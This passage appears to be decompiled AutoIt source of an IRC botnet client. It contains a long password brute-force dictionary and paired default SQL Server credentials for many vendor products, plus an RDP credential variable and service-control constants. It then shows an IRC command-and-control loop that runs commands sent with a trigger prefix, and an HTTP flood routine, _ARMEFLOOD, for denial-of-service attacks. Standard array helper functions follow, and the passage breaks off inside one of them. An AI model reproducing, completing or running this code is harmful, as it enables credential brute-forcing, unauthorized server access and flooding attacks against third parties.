$pass[0x4fc] = "power.liu"
$pass[0x4fd] = "idc0514"
$pass[0x4fe] = "power.yu"
$pass[0x4ff] = "power.com"
$pass[0x500] = "power0.123"
$pass[0x501] = "0258"
$pass[0x502] = "2323456"
$pass[0x503] = "5656789"
$pass[0x504] = "1qaz1qaz"
$pass[0x505] = "!@#321"
$pass[0x506] = "321!@#"
$pass[0x507] = "#@!123"
$pass[0x508] = "#@!321"
$pass[0x509] = "windows2003"
$pass[0x50a] = "ADMIN"
$pass[0x50b] = "a12345"
$pass[0x50c] = "a1b2c3"
$pass[0x50d] = "a1b2c3d4"
$pass[0x50e] = "!@#!@#!@#"
$pass[0x50f] = "ADMIN123"
$pass[0x510] = "SERVER"
$pass[0x511] = "ip138"
$pass[0x512] = "a1234"
$pass[0x513] = "a1234567"
$pass[0x514] = "a12345678"
$pass[0x515] = "caonimagebi"
$pass[0x516] = "zxcvbnm,./"
$pass[0x517] = "asdfghjkl;"
$pass[0x518] = "idc0.1"
$pass[0x519] = "123asdasd"
$pass[0x51a] = "idc0001"
$pass[0x51b] = "idc800888"
$pass[0x51c] = "love"
$pass[0x51d] = "zxc123"
$pass[0x51e] = "qqq"
$pass[0x51f] = "chenxin"
$pass[0x520] = "qwe1231a"
$pass[0x521] = "p0o9i8u7"
$pass[0x522] = "1q2w3e,"
$pass[0x523] = "dg10"
$pass[0x524] = "a1s2d3"
$pass[0x525] = "1a2s3d"
$pass[0x526] = "a1s2d3f4"
$pass[0x527] = "1a2s3d4f"
$pass[0x528] = "1a2s3d4f5g"
$pass[0x529] = "a1s2d3f4g5"
$pass[0x52a] = "1a2s3d4f5g6h"
$pass[0x52b] = "a1s2d3f4g5h6"
$pass[0x52c] = "1a2s3d4f5g6h7j"
$pass[0x52d] = "a1s2d3f4g5h6j7"
$pass[0x52e] = "1a2s3d4f5g6h7j8k"
$pass[0x52f] = "a1s2d3f4g5h6j7k8"
$pass[0x530] = "1a2s3d4f5g6h7j8k9l"
$pass[0x531] = "a1s2d3f4g5h6j7k8l9"
$pass[0x532] = "lai813524"
$pass[0x533] = "q1w2"
$pass[0x534] = "office1"
$pass[0x535] = "1p2o3i"
$pass[0x536] = "1qw23er45ty67u"
$pass[0x537] = "1qz"
$pass[0x538] = "123admin"
$pass[0x539] = "123asdf"
$pass[0x53a] = "123ewq"
$pass[0x53b] = "123go"
$pass[0x53c] = "123test"
$pass[0x53d] = "123454"
$pass[0x53e] = "224466"
$pass[0x53f] = "1234565"
$pass[0x540] = "aaaa"
$pass[0x541] = "aaaaa"
$pass[0x542] = "abgrtyu"
$pass[0x543] = "accept"
$pass[0x544] = "adm1n1strator"
$pass[0x545] = "adm1n"
$pass[0x546] = "adm1nistrator"
$pass[0x547] = "Admin1"
$pass[0x548] = "admin!"
$pass[0x549] = "administrat0r"
$pass[0x54a] = "administrator12"
$pass[0x54b] = "administrator123"
$pass[0x54c] = "administrator1234"
$pass[0x54d] = "administrator12345"
$pass[0x54e] = "administrator123456"
$pass[0x54f] = "adminpass"
$pass[0x550] = "adminroot"
$pass[0x551] = "adminserver"
$pass[0x552] = "adminservers"
$pass[0x553] = "admpro"
$pass[0x554] = "admsuper"
$pass[0x555] = "america"
$pass[0x556] = "amministratore"
$pass[0x557] = "angel"
$pass[0x558] = "any"
$pass[0x559] = "apache"
$pass[0x55a] = "apollo"
$pass[0x55b] = "apollo13"
$pass[0x55c] = "apple"
$pass[0x55d] = "aqwert"
$pass[0x55e] = "archie"
$pass[0x55f] = "ASDAS"
$pass[0x560] = "asddsa"
$pass[0x561] = "ASDF"
$pass[0x562] = "asdf123"
$pass[0x563] = "asdfg"
$pass[0x564] = "asdfghjk"
$pass[0x565] = "asdfjkl"
$pass[0x566] = "asdsa"
$pass[0x567] = "asdzxc"
$pass[0x568] = "asembler"
$pass[0x569] = "ashley"
$pass[0x56a] = "ask"
$pass[0x56b] = "asshole"
$pass[0x56c] = "baby"
$pass[0x56d] = "babygirl"
$pass[0x56e] = "backupexec"
$pass[0x56f] = "badboy"
$pass[0x570] = "banana"
$pass[0x571] = "batman"
$pass[0x572] = "bigbird"
$pass[0x573] = "bigcock"
$pass[0x574] = "bigdick"
$pass[0x575] = "bigdog"
$pass[0x576] = "bigfoot"
$pass[0x577] = "bigmac"
$pass[0x578] = "bigman"
$pass[0x579] = "bigred"
$pass[0x57a] = "bigtits"
$pass[0x57b] = "bitch"
$pass[0x57c] = "blablabla"
$pass[0x57d] = "black"
$pass[0x57e] = "blank"
$pass[0x57f] = "bond007"
$pass[0x580] = "booboo"
$pass[0x581] = "boss"
$pass[0x582] = "business"
$pass[0x583] = "buster"
$pass[0x584] = "buzz"
$pass[0x585] = "changeme"
$pass[0x586] = "client"
$pass[0x587] = "clustadm"
$pass[0x588] = "cluster"
$pass[0x589] = "cocacola"
$pass[0x58a] = "code"
$pass[0x58b] = "codename"
$pass[0x58c] = "codeword"
$pass[0x58d] = "compaq"
$pass[0x58e] = "computer"
$pass[0x58f] = "controller"
$pass[0x590] = "cookie"
$pass[0x591] = "cool"
$pass[0x592] = "cooladmin"
$pass[0x593] = "crackme"
$pass[0x594] = "customer"
$pass[0x595] = "danger"
$pass[0x596] = "database"
$pass[0x597] = "default"
$pass[0x598] = "dell"
$pass[0x599] = "demo"
$pass[0x59a] = "desktop"
$pass[0x59b] = "diablo"
$pass[0x59c] = "diamond"
$pass[0x59d] = "dmz"
$pass[0x59e] = "doggie"
$pass[0x59f] = "domain"
$pass[0x5a0] = "domino"
$pass[0x5a1] = "email"
$pass[0x5a2] = "enjoy"
$pass[0x5a3] = "erotic"
$pass[0x5a4] = "example"
$pass[0x5a5] = "exchadm"
$pass[0x5a6] = "exchange"
$pass[0x5a7] = "explorer"
$pass[0x5a8] = "extreme"
$pass[0x5a9] = "facebook"
$pass[0x5aa] = "fail"
$pass[0x5ab] = "file"
$pass[0x5ac] = "findme"
$pass[0x5ad] = "forever"
$pass[0x5ae] = "girl"
$pass[0x5af] = "golden"
$pass[0x5b0] = "google"
$pass[0x5b1] = "hack"
$pass[0x5b2] = "hacked"
$pass[0x5b3] = "hacker"
$pass[0x5b4] = "hackme"
$pass[0x5b5] = "hahaha"
$pass[0x5b6] = "hammer"
$pass[0x5b7] = "hardcore"
$pass[0x5b8] = "haslo"
$pass[0x5b9] = "heart"
$pass[0x5ba] = "hello"
$pass[0x5bb] = "helpme"
$pass[0x5bc] = "home"
$pass[0x5bd] = "hunting"
$pass[0x5be] = "ihavenopass"
$pass[0x5bf] = "iloveyou"
$pass[0x5c0] = "info"
$pass[0x5c1] = "internet"
$pass[0x5c2] = "kennwort"
$pass[0x5c3] = "key"
$pass[0x5c4] = "killer"
$pass[0x5c5] = "KKKKKKK"
$pass[0x5c6] = "lamer"
$pass[0x5c7] = "letmein"
$pass[0x5c8] = "linux"
$pass[0x5c9] = "little"
$pass[0x5ca] = "LocalAdministrator"
$pass[0x5cb] = "lock"
$pass[0x5cc] = "login1"
$pass[0x5cd] = "login12"
$pass[0x5ce] = "login123"
$pass[0x5cf] = "login1234"
$pass[0x5d0] = "login12345"
$pass[0x5d1] = "login123456"
$pass[0x5d2] = "lotus"
$pass[0x5d3] = "mac"
$pass[0x5d4] = "mail"
$pass[0x5d5] = "main"
$pass[0x5d6] = "maincomputer"
$pass[0x5d7] = "march"
$pass[0x5d8] = "market"
$pass[0x5d9] = "marketing"
$pass[0x5da] = "matrix"
$pass[0x5db] = "member"
$pass[0x5dc] = "midnight"
$pass[0x5dd] = "money"
$pass[0x5de] = "monkey"
$pass[0x5df] = "mycomputer"
$pass[0x5e0] = "myhome"
$pass[0x5e1] = "mypass"
$pass[0x5e2] = "mypassword"
$pass[0x5e3] = "mypc"
$pass[0x5e4] = "myself"
$pass[0x5e5] = "myserver"
$pass[0x5e6] = "myspace"
$pass[0x5e7] = "newsletter"
$pass[0x5e8] = "nobody"
$pass[0x5e9] = "noob"
$pass[0x5ea] = "nopass"
$pass[0x5eb] = "nopassw"
$pass[0x5ec] = "nopwd"
$pass[0x5ed] = "noshit"
$pass[0x5ee] = "notes"
$pass[0x5ef] = "nothing"
$pass[0x5f0] = "oracle"
$pass[0x5f1] = "orange"
$pass[0x5f2] = "orders"
$pass[0x5f3] = "owner"
$pass[0x5f4] = "p4ssw0rd"
$pass[0x5f5] = "parole"
$pass[0x5f6] = "pass12"
$pass[0x5f7] = "passion"
$pass[0x5f8] = "passwor"
$pass[0x5f9] = "password1234"
$pass[0x5fa] = "password12345"
$pass[0x5fb] = "password!"
$pass[0x5fc] = "passwords"
$pass[0x5fd] = "penis"
$pass[0x5fe] = "personal"
$pass[0x5ff] = "phpadmin"
$pass[0x600] = "player"
$pass[0x601] = "please"
$pass[0x602] = "pop3"
$pass[0x603] = "porn"
$pass[0x604] = "print"
$pass[0x605] = "private"
$pass[0x606] = "public"
$pass[0x607] = "pussy"
$pass[0x608] = "pw123"
$pass[0x609] = "qqqq"
$pass[0x60a] = "qqqqq"
$pass[0x60b] = "querty"
$pass[0x60c] = "quest"
$pass[0x60d] = "qw1234er"
$pass[0x60e] = "qwe456"
$pass[0x60f] = "qweewq"
$pass[0x610] = "QwerS"
$pass[0x611] = "qwert1234"
$pass[0x612] = "qwerty12"
$pass[0x613] = "QWERTY!"
$pass[0x614] = "qwertyu"
$pass[0x615] = "qwertyui"
$pass[0x616] = "qwewq"
$pass[0x617] = "r00tmaster"
$pass[0x618] = "radio"
$pass[0x619] = "raiders"
$pass[0x61a] = "rainbow"
$pass[0x61b] = "ranger"
$pass[0x61c] = "rdp"
$pass[0x61d] = "recruit"
$pass[0x61e] = "replicate"
$pass[0x61f] = "root123"
$pass[0x620] = "rootmaster"
$pass[0x621] = "rootroot"
$pass[0x622] = "router"
$pass[0x623] = "ruby"
$pass[0x624] = "safe"
$pass[0x625] = "sample"
$pass[0x626] = "saturn"
$pass[0x627] = "scan"
$pass[0x628] = "scorpio"
$pass[0x629] = "seagate"
$pass[0x62a] = "secret"
$pass[0x62b] = "secure"
$pass[0x62c] = "security"
$pass[0x62d] = "sex"
$pass[0x62e] = "sexy"
$pass[0x62f] = "shadow"
$pass[0x630] = "share"
$pass[0x631] = "shit"
$pass[0x632] = "silver"
$pass[0x633] = "site"
$pass[0x634] = "smtp"
$pass[0x635] = "spam"
$pass[0x636] = "sql"
$pass[0x637] = "sqlexec"
$pass[0x638] = "squirt"
$pass[0x639] = "staff"
$pass[0x63a] = "strong"
$pass[0x63b] = "stupid"
$pass[0x63c] = "sucks"
$pass[0x63d] = "supervisor"
$pass[0x63e] = "temp!"
$pass[0x63f] = "temporary"
$pass[0x640] = "temptemp"
$pass[0x641] = "terra"
$pass[0x642] = "test12"
$pass[0x643] = "test1234"
$pass[0x644] = "test12345"
$pass[0x645] = "test123456"
$pass[0x646] = "test!"
$pass[0x647] = "tester"
$pass[0x648] = "testing"
$pass[0x649] = "testmail"
$pass[0x64a] = "testtest"
$pass[0x64b] = "tivoli"
$pass[0x64c] = "trouble"
$pass[0x64d] = "unknown"
$pass[0x64e] = "user1234"
$pass[0x64f] = "user12345"
$pass[0x650] = "user12"
$pass[0x651] = "user123456"
$pass[0x652] = "veritas"
$pass[0x653] = "virus"
$pass[0x654] = "web"
$pass[0x655] = "webmail"
$pass[0x656] = "webmaster"
$pass[0x657] = "welcome"
$pass[0x658] = "whatever"
$pass[0x659] = "white"
$pass[0x65a] = "wizard"
$pass[0x65b] = "work"
$pass[0x65c] = "www"
$pass[0x65d] = "xxxx"
$pass[0x65e] = "xxxxx"
$pass[0x65f] = "xxxxxx"
$pass[0x660] = "zsxdcfvg"
$pass[0x661] = "zxccxz"
$pass[0x662] = "zxcxz"
$pass[0x663] = "zzzz"
$pass[0x664] = "vps"
$pass[0x665] = "zzzzz"
Dim $sqluser[0x41]
$sqluser[0x0] = "sa"
$sqluser[0x1] = "sa"
$sqluser[0x2] = "sa"
$sqluser[0x3] = "sa"
$sqluser[0x4] = "sa"
$sqluser[0x5] = "admin"
$sqluser[0x6] = "sa"
$sqluser[0x7] = "sa"
$sqluser[0x8] = "ARIS9"
$sqluser[0x9] = "ADONI"
$sqluser[0xa] = "gts"
$sqluser[0xb] = "sa"
$sqluser[0xc] = "sa"
$sqluser[0xd] = "sa"
$sqluser[0xe] = "sa"
$sqluser[0xf] = "sa"
$sqluser[0x10] = "admin"
$sqluser[0x11] = "ADMIN"
$sqluser[0x12] = "FB"
$sqluser[0x13] = "sa"
$sqluser[0x14] = "sa"
$sqluser[0x15] = "sa"
$sqluser[0x16] = "sa"
$sqluser[0x17] = "admin"
$sqluser[0x18] = "LENEL"
$sqluser[0x19] = "sa"
$sqluser[0x1a] = "stream"
$sqluser[0x1b] = "sa"
$sqluser[0x1c] = "cic"
$sqluser[0x1d] = "sa"
$sqluser[0x1e] = "cic"
$sqluser[0x1f] = "sa"
$sqluser[0x20] = "sa"
$sqluser[0x21] = "sa"
$sqluser[0x22] = "admin"
$sqluser[0x23] = "sa"
$sqluser[0x24] = "sa"
$sqluser[0x25] = "sa"
$sqluser[0x26] = "sa"
$sqluser[0x27] = "sa"
$sqluser[0x28] = "sa"
$sqluser[0x29] = "sa"
$sqluser[0x2a] = "secure"
$sqluser[0x2b] = "sa"
$sqluser[0x2c] = "wasadmin"
$sqluser[0x2d] = "maxadmin"
$sqluser[0x2e] = "mxintadm"
$sqluser[0x2f] = "maxreg"
$sqluser[0x30] = "sa"
$sqluser[0x31] = "I2b2metadata"
$sqluser[0x32] = "I2b2demodata"
$sqluser[0x33] = "I2b2workdata"
$sqluser[0x34] = "I2b2metadata2"
$sqluser[0x35] = "I2b2demodata2"
$sqluser[0x36] = "I2b2workdata2"
$sqluser[0x37] = "I2b2hive"
$sqluser[0x38] = "mcUser"
$sqluser[0x39] = "aadbo"
$sqluser[0x3a] = "wwdbo"
$sqluser[0x3b] = "aaAdmin"
$sqluser[0x3c] = "wwAdmin"
$sqluser[0x3d] = "aaPower"
$sqluser[0x3e] = "wwPower"
$sqluser[0x3f] = "aaUser"
$sqluser[0x40] = "wwUser"
Dim $sqlpass[0x41]
$sqlpass[0x0] = "sa"
$sqlpass[0x1] = "admin"
$sqlpass[0x2] = "superadmin"
$sqlpass[0x3] = "password"
$sqlpass[0x4] = "default"
$sqlpass[0x5] = "admin"
$sqlpass[0x6] = "RPSsql12345"
$sqlpass[0x7] = "$ei$micMicro"
$sqlpass[0x8] = "sqladmin"
$sqlpass[0x9] = "BPMS"
$sqlpass[0xa] = "opengts"
$sqlpass[0xb] = "PracticeUser1"
$sqlpass[0xc] = "42Emerson42Eme"
$sqlpass[0xd] = "sqlserver"
$sqlpass[0xe] = "Cardio.Perfect"
$sqlpass[0xf] = "vantage12!"
$sqlpass[0x10] = "netxms"
$sqlpass[0x11] = "AIMS"
$sqlpass[0x12] = "AIMS"
$sqlpass[0x13] = "$easyWinArt4"
$sqlpass[0x14] = "DBA!sa@EMSDB123"
$sqlpass[0x15] = "V4in$ight"
$sqlpass[0x16] = "Pass@123"
$sqlpass[0x17] = "trinity"
$sqlpass[0x18] = "MULTIMEDIA"
$sqlpass[0x19] = "SilkCentral12!34"
$sqlpass[0x1a] = "stream-1"
$sqlpass[0x1b] = "cic"
$sqlpass[0x1c] = "cic"
$sqlpass[0x1d] = "cic!23456789"
$sqlpass[0x1e] = "cic!23456789"
$sqlpass[0x1f] = "Administrator1"
$sqlpass[0x20] = "M3d!aP0rtal"
$sqlpass[0x21] = "splendidcrm2005"
$sqlpass[0x22] = "gnos"
$sqlpass[0x23] = "Dr8gedog"
$sqlpass[0x24] = "dr8gedog"
$sqlpass[0x25] = "Password123"
$sqlpass[0x26] = "DBA!sa@EMSDB123"
$sqlpass[0x27] = "SECAdmin1"
$sqlpass[0x28] = "skf_admin1"
$sqlpass[0x29] = "SecurityMaster08"
$sqlpass[0x2a] = "SecurityMaster08"
$sqlpass[0x2b] = ""
$sqlpass[0x2c] = "wasadmin"
$sqlpass[0x2d] = "maxadmin"
$sqlpass[0x2e] = "mxintadm"
$sqlpass[0x2f] = "maxreg"
$sqlpass[0x30] = "capassword"
$sqlpass[0x31] = "i2b2metadata"
$sqlpass[0x32] = "i2b2demodata"
$sqlpass[0x33] = "i2b2workdata"
$sqlpass[0x34] = "i2b2metadata2"
$sqlpass[0x35] = "i2b2demodata2"
$sqlpass[0x36] = "i2b2workdata2"
$sqlpass[0x37] = "i2b2hive"
$sqlpass[0x38] = "medocheck123"
$sqlpass[0x39] = "pwddbo"
$sqlpass[0x3a] = "pwddbo"
$sqlpass[0x3b] = "pwAdmin"
$sqlpass[0x3c] = "wwAdmin"
$sqlpass[0x3d] = "pwPower"
$sqlpass[0x3e] = "wwPower"
$sqlpass[0x3f] = "pwUser"
$sqlpass[0x40] = "wwUser"
Global Const $service_auto_start = 0x2
Global $rdpcreds = ""
Global $standard_rights_required = 0xf0000
Global $sc_manager_connect = 0x1
Global $sc_manager_create_service = 0x2
Global $sc_manager_enumerate_service = 0x4
Global $sc_manager_lock = 0x8
Global $sc_manager_query_lock_status = 0x10
Global $sc_manager_modify_boot_config = 0x20
Global $sc_manager_all_access = BitOR($standard_rights_required, $sc_manager_connect, $sc_manager_create_service, $sc_manager_enumerate_service, $sc_manager_lock, $sc_manager_query_lock_status, $sc_manager_modify_boot_config)
Local $__ndll = "N.dll"
Local $__nmod = DllCall("kernel32.dll", "handle", "GetModuleHandleW", "wstr", $__ndll)[0x0]
If Not $__nmod Then $__nmod = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $__ndll)[0x0]
Local $__npfn_global = __N_GETPROC(0x65)
Local $__npfn_local = __N_GETPROC(0x66)
Local $__npfn_run = __N_GETPROC(0x67)
Local $__npfn_ismain = __N_GETPROC(0x68)
Local $__npfn_prepmain = __N_GETPROC(0x69)
Local $__npfn_prepsub = __N_GETPROC(0x6a)
Local $__npfn_wait = __N_GETPROC(0x6b)
Local $__npfn_waitall = __N_GETPROC(0x6c)
Local $__ndll = @AutoItX64 ? "N64.dll" : "N.dll"
Local $__nmod = DllCall("kernel32.dll", "handle", "GetModuleHandleW", "wstr", $__ndll)[0x0]
If Not $__nmod Then $__nmod = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $__ndll)[0x0]
Local $__npfn_global = __N_GETPROC(0x65)
Local $__npfn_local = __N_GETPROC(0x66)
Local $__npfn_run = __N_GETPROC(0x67)
Local $__npfn_ismain = __N_GETPROC(0x68)
Local $__npfn_prepmain = __N_GETPROC(0x69)
Local $__npfn_prepsub = __N_GETPROC(0x6a)
Local $__npfn_wait = __N_GETPROC(0x6b)
Local $__npfn_waitall = __N_GETPROC(0x6c)
Dim $threads[$maxthreads]
For $i = 0x0 To $maxthreads
    $threads[$i] = NMAIN(NRUN("netdb"))
Next
Opt("TCPTimeout", 0x1388)
While 0x1
    Global $sock = IRC_CONNECT($nodes)
    While 0x1
        $recv = TCPRecv($sock, 0x2000)
        If @error Then ExitLoop 0x1
        Local $sdata = StringSplit($recv, @CRLF)
        For $i = 0x1 To $sdata[0x0] Step 0x1
            Local $stemp = StringSplit($sdata[$i], " ")
            If $stemp[0x1] == "" Then ContinueLoop
            If $stemp[0x0] < 0x2 Then ContinueLoop
            If $stemp[0x1] == "PING" Then PONG($sock, $stemp[0x2])
            If $stemp[0x2] == "376" Or $stemp[0x2] == "422" Then
                CHANGEMODE($sock, "+i", $nick)
                JOINCHANNEL($sock, $channel & " " & $key)
            ElseIf $stemp[0x2] == "352" Then
                NEWNICKNAME($sock)
            EndIf
            Switch $stemp[0x2]
                Case "PRIVMSG"
                    $user = StringMid($stemp[0x1], 0x2, $stemp[0x1])
                    $msg = StringMid($sdata[$i], StringInStr($sdata[$i], ":", 0x0, 0x2) + 0x1)
                    If StringLeft($msg, 0x1) = $trigger Then
                        CMD($user, $stemp[0x3], $msg)
                    EndIf
            EndSwitch
        Next
    WEnd
WEnd

Func __FTP_INIT()
    $__ghwininet_ftp = DllOpen("wininet.dll")
EndFunc   ;==>__FTP_INIT
Func __N_GETPROC($i)
    Return DllCall("kernel32.dll", "ptr", "GetProcAddress", "handle", $__nmod, "ptr", Ptr($i))[0x0]
EndFunc   ;==>__N_GETPROC
Func _ARMEFLOOD($host, $port, $path, $time)
    $ip = TCPNameToIP($host)
    $port = Int($port)
    $time = Int($time)
    TCPStartup()
    Local $timer = TimerInit(), $diff = 0x0
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= $time * 0x3e8 Then
            ExitLoop
        EndIf
        $httpsock = TCPConnect($ip, $port)
        While Not @error
            $sent = _HTTPARME($host, $path, $httpsock)
            If $diff >= $time * 0x3e8 Then
                ExitLoop
            EndIf
        WEnd
        TCPCloseSocket($httpsock)
    WEnd
EndFunc   ;==>_ARMEFLOOD
Func _ArrayAdd(ByRef $aarray, $vvalue, $istart = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
    If $istart = Default Then $istart = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $arrayfill_force_default
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    Local $hdatatype = 0x0
    Switch $iforce
        Case $arrayfill_force_int
            $hdatatype = INT
        Case $arrayfill_force_number
            $hdatatype = NUMBER
        Case $arrayfill_force_ptr
            $hdatatype = PTR
        Case $arrayfill_force_hwnd
            $hdatatype = HWND
        Case $arrayfill_force_string
            $hdatatype = STRING
        Case $arrayfill_force_boolean
            $hdatatype = "Boolean"
    EndSwitch
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $iforce = $arrayfill_force_singleitem Then
                ReDim $aarray[$idim_1 + 0x1]
                $aarray[$idim_1] = $vvalue
                Return $idim_1
            EndIf
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
                $hdatatype = 0x0
            Else
                Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
                If UBound($atmp, $ubound_rows) = 0x1 Then
                    $atmp[0x0] = $vvalue
                EndIf
                $vvalue = $atmp
            EndIf
            Local $iadd = UBound($vvalue, $ubound_rows)
            ReDim $aarray[$idim_1 + $iadd]
            For $i = 0x0 To $iadd + 0xffffffff
                If String($hdatatype) = "Boolean" Then
                    Switch $vvalue[$i]
                        Case "True", "1"
                            $aarray[$idim_1 + $i] = True
                        Case "False", "0", ""
                            $aarray[$idim_1 + $i] = False
                    EndSwitch
                ElseIf ISFUNC($hdatatype) Then
                    $aarray[$idim_1 + $i] = $HDATATYPE($vvalue[$i])
                Else
                    $aarray[$idim_1 + $i] = $vvalue[$i]
                EndIf
            Next
            Return $idim_1 + $iadd + 0xffffffff
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $istart < 0x0 Or $istart > $idim_2 + 0xffffffff Then Return SetError(0x4, 0x0, +0xffffffff)
            Local $ivaldim_1, $ivaldim_2 = 0x0, $icolcount
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x2 Then Return SetError(0x5, 0x0, +0xffffffff)
                $ivaldim_1 = UBound($vvalue, $ubound_rows)
                $ivaldim_2 = UBound($vvalue, $ubound_columns)
                $hdatatype = 0x0
            Else
                Local $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
                $ivaldim_1 = UBound($asplit_1, $ubound_rows)
                Local $atmp[$ivaldim_1][0x0], $asplit_2
                For $i = 0x0 To $ivaldim_1 + 0xffffffff
                    $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
                    $icolcount = UBound($asplit_2)
                    If $icolcount > $ivaldim_2 Then
                        $ivaldim_2 = $icolcount
                        ReDim $atmp[$ivaldim_1][$ivaldim_2]
                    EndIf
                    For $j = 0x0 To $icolcount + 0xffffffff
                        $atmp[$i][$j] = $asplit_2[$j]
                    Next
                Next
                $vvalue = $atmp
            EndIf
            If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(0x3, 0x0, +0xffffffff)
            ReDim $aarray[$idim_1 + $ivaldim_1][$idim_2]
            For $iwriteto_index = 0x0 To $ivaldim_1 + 0xffffffff
                For $j = 0x0 To $idim_2 + 0xffffffff
                    If $j < $istart Then
                        $aarray[$iwriteto_index + $idim_1][$j] = ""
                    ElseIf $j - $istart > $ivaldim_2 + 0xffffffff Then
                        $aarray[$iwriteto_index + $idim_1][$j] = ""
                    Else
                        If String($hdatatype) = "Boolean" Then
                            Switch $vvalue[$iwriteto_index][$j - $istart]
                                Case "True", "1"
                                    $aarray[$iwriteto_index + $idim_1][$j] = True
                                Case "False", "0", ""
                                    $aarray[$iwriteto_index + $idim_1][$j] = False
                            EndSwitch
                        ElseIf ISFUNC($hdatatype) Then
                            $aarray[$iwriteto_index + $idim_1][$j] = $HDATATYPE($vvalue[$iwriteto_index][$j - $istart])
                        Else
                            $aarray[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $istart]
                        EndIf
                    EndIf
                Next
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarray, $ubound_rows) + 0xffffffff
EndFunc   ;==>_ARRAYADD
Func _ArrayDelete(ByRef $aarray, $vrange)
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If IsArray($vrange) Then
        If UBound($vrange, $ubound_dimensions) <> 0x1 Or UBound($vrange, $ubound_rows) < 0x2 Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        Local $inumber, $asplit_1, $asplit_2
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ""
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(0x3, 0x0, +0xffffffff)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
                Case 0x1
                    $vrange &= $asplit_2[0x1] & ";"
                Case 0x2
                    If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                        $inumber = $asplit_2[0x1] + 0xffffffff
                        Do
                            $inumber += 0x1
                            $vrange &= $inumber & ";"
                        Until $inumber = $asplit_2[0x2]
                    EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, +0xffffffff)
    Local $icopyto_index = 0x0
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            For $i = 0x1 To $vrange[0x0]
                $aarray[$vrange[$i]] = ChrW(0xfab1)
            Next
            For $ireadfrom_index = 0x0 To $idim_1
                If $aarray[$ireadfrom_index] == ChrW(0xfab1) Then
                    ContinueLoop
                Else
                    If $ireadfrom_index <> $icopyto_index Then
                        $aarray[$icopyto_index] = $aarray[$ireadfrom_index]
                    EndIf
                    $icopyto_index += 0x1
                EndIf
            Next
            ReDim $aarray[$idim_1 - $vrange[0x0] + 0x1]
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            For $i = 0x1 To $vrange[0x0]
                $aarray[$vrange[$i]][0x0] = ChrW(0xfab1)
            Next
            For $ireadfrom_index = 0x0 To $idim_1
                If $aarray[$ireadfrom_index][0x0] == ChrW(0xfab1) Then
                    ContinueLoop
                Else
                    If $ireadfrom_index <> $icopyto_index Then
                        For $j = 0x0 To $idim_2
                            $aarray[$icopyto_index][$j] = $aarray[$ireadfrom_index][$j]
                        Next
                    EndIf
                    $icopyto_index += 0x1
                EndIf
            Next
            ReDim $aarray[$idim_1 - $vrange[0x0] + 0x1][$idim_2 + 0x1]
        Case Else
            Return SetError(0x2, 0x0, False)
    EndSwitch
    Return UBound($aarray, $ubound_rows)
EndFunc   ;==>_ARRAYDELETE
Func _ArrayFindAll(Const ByRef $aarray, $vvalue, $istart = 0x0, $iend = 0x0, $icase = 0x0, $icompare = 0x0, $isubitem = 0x0, $brow = False)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $icase = Default Then $icase = 0x0
    If $icompare = Default Then $icompare = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If $brow = Default Then $brow = False
    $istart = _ArraySearch($aarray, $vvalue, $istart, $iend, $icase, $icompare, 0x1, $isubitem, $brow)
    If @error Then Return SetError(@error, 0x0, +0xffffffff)
    Local $iindex = 0x0, $avresult[UBound($aarray, ($brow ? $ubound_columns : $ubound_rows))]
    Do
        $avresult[$iindex] = $istart
        $iindex += 0x1
        $istart = _ArraySearch($aarray, $vvalue, $istart + 0x1, $iend, $icase, $icompare, 0x1, $isubitem, $brow)
    Until @error
    ReDim $avresult[$iindex]
    Return $avresult
EndFunc   ;==>_ARRAYFINDALL
Func _ArrayInsert(ByRef $aarray, $vrange, $vvalue = "", $istart = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
    If $vvalue = Default Then $vvalue = ""
    If $istart = Default Then $istart = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $arrayfill_force_default
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    Local $hdatatype = 0x0
    Switch $iforce
        Case $arrayfill_force_int
            $hdatatype = INT
